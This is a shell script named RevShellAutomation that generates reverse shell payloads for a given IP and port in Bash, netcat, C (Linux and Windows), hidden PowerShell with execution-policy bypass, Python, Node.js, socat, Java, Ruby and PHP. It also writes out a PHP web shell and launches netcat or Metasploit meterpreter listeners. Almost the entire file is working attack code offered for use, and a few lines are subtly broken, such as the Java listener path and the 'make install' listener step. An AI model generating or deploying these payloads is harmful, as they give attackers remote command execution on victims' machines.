#!/bin/sh
#by Mohamed Alzhrani
YELLOW='\033[33m'
LIGHT='\033[95m'
CYAN='\033[96m'
NC='\033[0m'

while [ $# -gt 0 ]; do
        key="$1"

        case "${key}" in
        -ip)
                HOST="$2"
                shift
                shift
                ;;
        -port)
                PORT="$2"
                shift
                shift
                ;;
        -t)
               TYPE="$2"
                shift
                shift
                ;;

        esac
done

PAGE1() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                \"RevShellAutomation                                                       ||
  ||                                                                                                          ||
  ||  Author  : Mohamed Alzhrani                                                                              ||
  ||  Url     : https://github.com/xMohamed0                                                                  ||
  ||  usage   : Ex: RevShellAutomation.sh -ip 10.10.10.10 -port 1337 -t Bash [Enter the type]                 ||
  ||  Types   :                                                                                               ||
  ||  * Bash                                                                                                  ||
  ||  * Nc                                                                                                    ||
  ||  * C                                                                                                     ||
  ||  * PowerShell                                                                                            ||
  ||  * Python                                                                                                ||
  ||  * NodeJS                                                                                                ||
  ||  * socat                                                                                                 ||
  ||  * Java                                                                                                  ||
  ||  * Ruby                                                                                                  ||
  ||  * PHP                                                                                                   ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        exit 1
}

bashI() {
        echo
        echo
        printf "${CYAN}bash -i revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}BASH RevShell:${NC}\n\n"
        printf "${YELLOW}sh -i >& /dev/tcp/${HOST}/${PORT} 0>&1${NC}\n\n"

        echo
        echo
        echo
        lastp

}

bash196() {
        echo
        echo
        printf "${CYAN}bash 196 revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}BASH RevShell:${NC}\n\n"
        printf "${YELLOW}0<&196;exec 196<>/dev/tcp/${HOST}/${PORT}; sh <&196 >&196 2>&196${NC}\n\n"

        echo
        echo
        echo
        lastp

}

bashRd() {
        echo
        echo
        printf "${CYAN}bash read line revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}BASH RevShell:${NC}\n\n"
        printf "${YELLOW}exec 5<>/dev/tcp/${HOST}/${PORT};cat <&5 | while read line; do $line 2>&5 >&5; done${NC}\n\n"

        echo
        echo
        echo
        lastp

}

bash5() {
        echo
        echo
        printf "${CYAN}bash 5 revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}BASH RevShell:${NC}\n\n"
        printf "${YELLOW}sh -i 5<> /dev/tcp/${HOST}/${PORT} 0<&5 1>&5 2>&5${NC}\n\n"

        echo
        echo
        echo
        lastp

}

bashudp() {
        echo
        echo
        printf "${CYAN}bash udp revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}BASH RevShell:${NC}\n\n"
        printf "${YELLOW}sh -i >& /dev/udp/${HOST}/${PORT} 0>&1${NC}\n\n"

        echo
        echo
        echo
        lastp

}

bashRev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                           BASH REVERSE SHELL                                             ||
  ||    Choose one of this bash reverse shell                                                                 ||
  ||    bash -i         >> enter 1                                                                            ||
  ||    bash 196        >> enter 2                                                                            ||
  ||    bash read line  >> enter 3                                                                            ||
  ||    bash 5          >> enter 4                                                                            ||
  ||    bash udp        >> enter 5                                                                            ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2 ,3 , 4 , 5\n"
        printf "${NC}\n"
        while true; do
          read -p "enter the number  >>  " sn
          case $sn in
            [1]* ) bashI;;
            [2]* ) bash196;;
            [3]* ) bashRd;;
            [4]* ) bash5;;
            [5]* ) bashudp;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

NcMkfifo() {
        echo
        echo
        printf "${CYAN}NC mkfifo revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}NC RevShell:${NC}\n\n"
        printf "${YELLOW}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${HOST} ${PORT} >/tmp/f${NC}\n\n"

        echo
        echo
        echo
        lastp

}

NcE() {
        echo
        echo
        printf "${CYAN}NC -e revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}NC RevShell:${NC}\n\n"
        printf "${YELLOW}nc -e sh ${HOST} ${PORT}${NC}\n\n"

        echo
        echo
        echo
        lastp

}

NcEx() {
        echo
        echo
        printf "${CYAN}NC.exe -e revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}NC RevShell:${NC}\n\n"
        printf "${YELLOW}nc -e cmd ${HOST} ${PORT}${NC}\n\n"

        echo
        echo
        echo
        lastp

}

NcC() {
        echo
        echo
        printf "${CYAN}NC -c revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}NC RevShell:${NC}\n\n"
        printf "${YELLOW}nc -c sh ${HOST} ${PORT}${NC}\n\n"

        echo
        echo
        echo
        lastp

}

NcCE() {
        echo
        echo
        printf "${CYAN}ncat.exe -e revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}NC RevShell:${NC}\n\n"
        printf "${YELLOW}ncat.exe ${HOST} ${PORT} -e sh${NC}\n\n"

        echo
        echo
        echo
        lastp

}

NcRev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                           NC REVERSE SHELL                                               ||
  ||    Choose one of this NC reverse shell                                                                   ||
  ||    nc mkfifo         >> enter 1                                                                          ||
  ||    nc -e             >> enter 2                                                                          ||
  ||    nc.exe -e         >> enter 3                                                                          ||
  ||    nc -c             >> enter 4                                                                          ||
  ||    ncat.exe -e       >> enter 5                                                                          ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2 ,3 , 4 , 5\n"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) NcMkfifo;;
            [2]* ) NcE;;
            [3]* ) NcEx;;
            [4]* ) NcC;;
            [5]* ) NcCE;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

Crev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                            C REVERSE SHELL                                               ||
  ||    Choose one of this C reverse shell                                                                    ||
  ||    C                 >> enter 1                                                                          ||
  ||    C Windows         >> enter 2                                                                          ||
  ||    NOTE! : it will be compiled                                                                           ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) Creverse;;
            [2]* ) CreverseWin;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

Creverse() {
        echo
        echo
        printf "${CYAN}C revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}C RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        printf '
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = PORT;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("IP");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;
}' | tee revshell_${HOST}_${PORT}.c && perl -pi -e "s/IP/${HOST}/g" revshell_${HOST}_${PORT}.c && perl -pi -e "s/PORT/${PORT}/g" revshell_${HOST}_${PORT}.c && gcc revshell_${HOST}_${PORT}.c  && cat revshell_${HOST}_${PORT}.c
        echo
        echo
        printf "${YELLOW}YOUR C REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

CreverseWin() {
        echo
        echo
        printf "${CYAN}C revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}C Win RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        printf '
        #include <winsock2.h>
        #include <stdio.h>
        #pragma comment(lib,"ws2_32")

        WSADATA wsaData;
        SOCKET Winsock;
        struct sockaddr_in hax;
        char ip_addr[16] = "IP";
        char port[6] = "PORT";

        STARTUPINFO ini_processo;

        PROCESS_INFORMATION processo_info;

        int main()
        {
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


            struct hostent *host;
            host = gethostbyname(ip_addr);
            strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

            hax.sin_family = AF_INET;
            hax.sin_port = htons(atoi(port));
            hax.sin_addr.s_addr = inet_addr(ip_addr);

            WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

            memset(&ini_processo, 0, sizeof(ini_processo));
            ini_processo.cb = sizeof(ini_processo);
            ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

            TCHAR cmd[255] = TEXT("cmd.exe");

            CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

            return 0;
        }' | tee revshellWin_${HOST}_${PORT}.c && perl -pi -e "s/IP/${HOST}/g" revshellWin_${HOST}_${PORT}.c && perl -pi -e "s/PORT/${PORT}/g" revshellWin_${HOST}_${PORT}.c && cat revshellWin_${HOST}_${PORT}.c
        echo
        echo
        printf "${YELLOW}YOUR C REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

PoweShellRev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                            PowerShell REVERSE SHELL                                      ||
  ||    Choose one of this PowerShell reverse shell                                                           ||
  ||    PowerShell#1      >> enter 1                                                                          ||
  ||    PowerShell#2      >> enter 2                                                                          ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) PowerSh1;;
            [2]* ) PowerSh2;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

PowerSh1() {
        echo
        echo
        printf "${CYAN}PowerShell revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}PowerShell RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | tee revshellPowerShell1_${HOST}_${PORT}.ps && perl -pi -e "s/IP/${HOST}/g" revshellPowerShell1_${HOST}_${PORT}.ps && perl -pi -e "s/PORT/${PORT}/g" revshellPowerShell1_${HOST}_${PORT}.ps && cat revshellPowerShell1_${HOST}_${PORT}.ps
        echo
        echo
        printf "${YELLOW}YOUR PowerShell REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

PowerSh2() {
        echo
        echo
        printf "${CYAN}PowerShell revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}PowerShell#2 RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("IP", PORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"' | tee revshellPowerShell12_${HOST}_${PORT}.ps && perl -pi -e "s/IP/${HOST}/g" revshellPowerShell12_${HOST}_${PORT}.ps && perl -pi -e "s/PORT/${PORT}/g" revshellPowerShell12_${HOST}_${PORT}.ps && cat revshellPowerShell12_${HOST}_${PORT}.ps
        echo
        echo
        printf "${YELLOW}YOUR PowerShell REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

PythonRevShell() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                           Python REVERSE SHELL                                           ||
  ||    Choose one of this Python reverse shell                                                               ||
  ||    Python2      >> enter 1                                                                               ||
  ||    Pyhton3      >> enter 2                                                                               ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) PythonRevSh1;;
            [2]* ) PythonRevSh2;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

PythonRevSh1() {
        echo
        echo
        printf "${CYAN}Python revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}Pyhton#1 RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e "export RHOST=\x22${HOST}\x22;export RPORT=${PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\x22RHOST\x22),int(os.getenv(\x22RPORT\x22))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\x22sh\x22)'" | tee Python_RevShell${HOST}_${PORT}.py
        echo
        echo
        printf "${YELLOW}YOUR Python REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

PythonRevSh2() {
        echo
        echo
        printf "${CYAN}Python revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}Pyhton3 RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x22${HOST}\x22,${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\x22sh\x22)'" | tee Python3_RevShell${HOST}_${PORT}.py
        echo
        echo
        printf "${YELLOW}YOUR Python REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

nodeJS() {
        echo
        echo
        printf "${CYAN}nodeJS revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}nodeJS RevShell:${NC}\n\n"
        printf "${YELLOW}require('child_process').exec('nc -e sh ${HOST} ${PORT}')${NC}\n\n"

        echo
        echo
        echo
        lastp

}

Socat() {
        echo
        echo
        printf "${CYAN}Socat revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}Socat RevShell:${NC}\n\n"
        printf "${YELLOW}socat TCP:${HOST}:${PORT} EXEC:sh${NC}\n\n"

        echo
        echo
        echo
        lastp

}

JavaRevShell1() {
        echo
        echo
        printf "${CYAN}JAVA revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}JAVA RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
        public class Java_RevShell {
            public static void main(String[] args) {
                Process p;
                try {
                    p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/IP/PORT 0>&1");
                    p.waitFor();
                    p.destroy();
                } catch (Exception e) {}
            }
        }' | tee Java_RevShell.java && perl -pi -e "s/IP/${HOST}/g" Java_RevShell.java && perl -pi -e "s/PORT/${PORT}/g" Java_RevShell.java && javac Java_RevShell.java && cat Java_RevShell.java
        echo
        echo
        printf "${YELLOW}YOUR JAVA REVERSE SHELL COMPILED AND SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

JavaRevShell2() {
        echo
        echo
        printf "${CYAN}JAVA revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}JAVA RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
        import java.io.InputStream;
        import java.io.OutputStream;
        import java.net.Socket;

        public class Java2_RevShell {
            public static void main(String[] args) {
                String host = "IP";
                int port = PORT;
                String cmd = "sh";
                try {
                    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                    Socket s = new Socket(host, port);
                    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                    while (!s.isClosed()) {
                        while (pi.available() > 0)
                            so.write(pi.read());
                        while (pe.available() > 0)
                            so.write(pe.read());
                        while (si.available() > 0)
                            po.write(si.read());
                        so.flush();
                        po.flush();
                        Thread.sleep(50);
                        try {
                            p.exitValue();
                            break;
                        } catch (Exception e) {}
                    }
                    p.destroy();
                    s.close();
                } catch (Exception e) {}
            }
        }' | tee Java2_RevShell.java && perl -pi -e "s/IP/${HOST}/g" Java2_RevShell.java && perl -pi -e "s/PORT/${PORT}/g" Java2_RevShell.java && javac Java2_RevShell.java && Java2_RevShell.java
        echo
        echo
        printf "${YELLOW}YOUR JAVA REVERSE SHELL COMPILED AND SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        echo
        echo
        lastp

}

JavaRev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                           JAVA REVERSE SHELL                                             ||
  ||    Choose one of this Java reverse shell                                                                 ||
  ||    Java#1       >> enter 1                                                                               ||
  ||    Java#2       >> enter 2                                                                               ||
  ||    NOTE! :  it will be compiled                                                                          ||
  <============================================================================================================>

                                                                                                                     \e[0m"
       if ! which javac > /dev/null; then
      echo -e "javac not found! Do you want to Install it? (y/n) \c"
      read
      if "$REPLY" = "y"; then
      sudo apt-get install default-jdk
      fi
       fi
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) JavaRevShell1;;
            [2]* ) JavaRevShell2;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

Ruby() {
        echo
        echo
        printf "${CYAN}Ruby revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}Ruby RevShell:${NC}\n\n"
        printf "${YELLOW}ruby -rsocket -e'spawn(\x22sh\x22,[:in,:out,:err]=>TCPSocket.new(\x22${HOST}\x22,${PORT}))'${NC}\n\n"

        echo
        echo
        echo
        lastp

}

PhpRev() {
  echo -e "\e[33m

  <============================================================================================================>
  ||                                           PHP REVERSE SHELL                                              ||
  ||    Choose one of this PHP reverse shell                                                                  ||
  ||    PHP cmd      >> enter 1                                                                               ||
  ||    PHP exec     >> enter 2                                                                               ||
  <============================================================================================================>

                                                                                                                     \e[0m"
        printf "\n\n"
        printf "${CYAN}CHOOSE AN ACTION FROM THE LIST 1 , 2"
        printf "${NC}\n"
        while true; do
          read -p "enter the number >>  " sn
          case $sn in
            [1]* ) PhpRev1;;
            [2]* ) PhpRev2;;
            [0]* ) exit;;
            * ) echo "Please choose action from the list above or click 0 to exit  >>  ";;
          esac
      done
}

PhpRev2() {
        echo
        echo
        printf "${CYAN}PHP revShell\n"
        printf "${NC}\n"
        printf "${LIGHT}PHP EXEC RevShell:${NC}\n\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
        php -r \x27$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");' | tee phpRevShell.php && perl -pi -e "s/IP/${HOST}/g" phpRevShell.php && perl -pi -e "s/PORT/${PORT}/g" phpRevShell.php && cat phpRevShell.php

        echo
        echo
        echo
        lastp

}

PhpRev1() {
        echo
        echo
        printf "${CYAN}PHP revShell\n"
        printf "${NC}\n"
        mkdir -p "${HOST}" && cd "${HOST}" &&
        echo -e '
        <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER[\x27PHP_SELF\x27]); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET[\x27cmd\x27]))
    {
        system($_GET[\x27cmd\x27]);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html> ' | tee php_rev_cmd.php
        echo
        echo
        printf "${YELLOW}YOUR PHP CMD REVERSE SHELL SAVED ON $(cd "$(dirname "$1")"; pwd -P)/$(basename "$1") ${NC}\n\n"
        echo
        lastp

}

METER() {

      msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost ${HOST}; set lport ${PORT}; exploit"

}

NCLIST() {

  nc -lvnp ${PORT}

}
StartList() {

        printf "${CYAN}What Listener do you want\n"
        printf "${CYAN}NC OR Meterpreter\n"
        printf "${NC}\n\n"
        read -p "N for nc M for Meterpreter, Press any key for return  >>  " nm
        case $nm in
          [Nn]* ) make install; break;;
          [Mm]* ) METER;;
        esac
    #done
}

lastp() {

        printf "${CYAN}DONE\n"
        printf "${NC}\n\n"
          read -p "Do you want to start Listener?[yes or no to Exit or any key to back]  >>  " yn
          case $yn in
            [Yy]* ) StartList;;
            [Nn]* ) exit;;
          esac


        printf "${NC}\n"
}


main() {


        case "${TYPE}" in
        [Bb]ash) bashRev ;;
        [Nn]c)   NcRev   ;;
        [Cc]) Crev ;;
        [Pp]owerShell) PoweShellRev ;;
        [Pp]ython) PythonRevShell ;;
        [Nn]odeJS) nodeJS ;;
        [Ss]ocat) Socat ;;
        [Jj]ava) JavaRev ;;
        [Rr]uby) Ruby ;;
        [Pp]hp) PhpRev ;;
        esac

        lastp
}

if [ -z "${TYPE}" ] || [ -z "${HOST}" ] || [ -z "${PORT}" ]; then
        PAGE1
fi

if ! expr "${HOST}" : '^\([0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\)$' >/dev/null; then
        printf "${YELLOW}\n"
        printf "${YELLOW}Invalid IP !\n"
        PAGE1
fi

if ! case "${TYPE}" in [Bb]ash | [Nn]c | [Cc] | [Pp]owerShell | [Pp]ython | [Nn]odeJS | [Ss]ocat | [Jj]ava | [Rr]uby | [Pp]hp) false ;; esac then
        main
fi
